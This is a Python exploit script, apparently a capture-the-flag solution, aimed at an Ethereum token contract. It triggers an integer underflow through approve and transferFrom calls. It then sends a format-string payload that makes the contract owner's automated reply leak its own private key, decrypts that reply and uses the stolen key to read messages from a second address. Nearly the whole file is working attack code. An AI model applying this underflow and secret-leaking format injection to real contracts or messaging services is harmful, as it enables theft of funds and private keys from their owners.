from iirc import *

CONTRACT_ADDRESS = "0xF625AE3A94801E476a224A9aB117ca9F6e442743"
EVIL_ADDRESS = "0x8A7Ff03D175Fd00462EA737eC08f2385859d9a4F"
ACCOUNT_1_PRIVATE_KEY = "REDACTED"
ACCOUNT_2_PRIVATE_KEY = "REDACTED"


class EnhancedAccount(Account):
    def approve(self, spender, value):
        self.execute(Shared.contract.functions.approve, spender, value)

    def transfer_from(self, from_, to, value):
        self.execute(Shared.contract.functions.transferFrom, from_, to, value)


def main():
    # Setup the contract and accounts.
    with open("iirc.json") as f:
        Shared.contract = w3.eth.contract(CONTRACT_ADDRESS, abi=json.load(f))

    account_1 = EnhancedAccount(ACCOUNT_1_PRIVATE_KEY)
    account_2 = EnhancedAccount(ACCOUNT_2_PRIVATE_KEY)

    Shared.accounts = [account_1, account_2]

    # Perform the underflow.
    account_1.approve(account_1.account.address, 1)
    account_1.approve(account_2.account.address, 1)

    account_1.transfer_from(account_1.account.address, account_2.account.address, 1)
    account_2.transfer_from(account_1.account.address, account_2.account.address, 1)

    # Perform the format exploit.
    from_block = w3.eth.block_number
    Shared.account = 0
    message_owner("|PK|{account.private_key}|PK|")

    # Await the reply.
    owner_address = account_1.get_owner()
    reply = None
    while reply is None:
        logs = w3.eth.get_logs({
            "fromBlock": from_block,
            "address": Shared.contract.address,
            "topics": [
                "0x5c640cddf0cd2eec63278ce12860a658f1edfb6554a96a9b84316fd5e8818c25",
                f"""0x{owner_address[2:].rjust(64, "0")}""",
                f"""0x{account_1.account.address[2:].rjust(64, "0")}"""
            ]
        })

        for event in logs:
            reply = event
            break

    # Decrypt the reply and extract the private key.
    data = bytes.fromhex(reply.data[2:])
    message_public_key = (bytes_to_long(data[0:32]), bytes_to_long(data[32:64]))
    blocks = [data[i:i + 16] for i in range(128, len(data), 32)]

    message_ = account_1.decrypt(message_public_key, blocks)
    private_key = int(message_.split("|PK|")[1])
    account_2.private_key = private_key  # So we can use the provided decryption method.

    # Get the evil messages and decrypt them.
    logs = w3.eth.get_logs({
        "fromBlock": 0,
        "address": Shared.contract.address,
        "topics": [
            "0x5c640cddf0cd2eec63278ce12860a658f1edfb6554a96a9b84316fd5e8818c25",
            f"""0x{EVIL_ADDRESS[2:].rjust(64, "0")}""",
            f"""0x{owner_address[2:].rjust(64, "0")}""",
        ]
    })

    for event in logs:
        data = bytes.fromhex(event.data[2:])
        message_public_key = (bytes_to_long(data[0:32]), bytes_to_long(data[32:64]))
        blocks = [data[i:i + 16] for i in range(128, len(data), 32)]

        message_ = account_2.decrypt(message_public_key, blocks)
        print(message_)


if __name__ == '__main__':
    main()
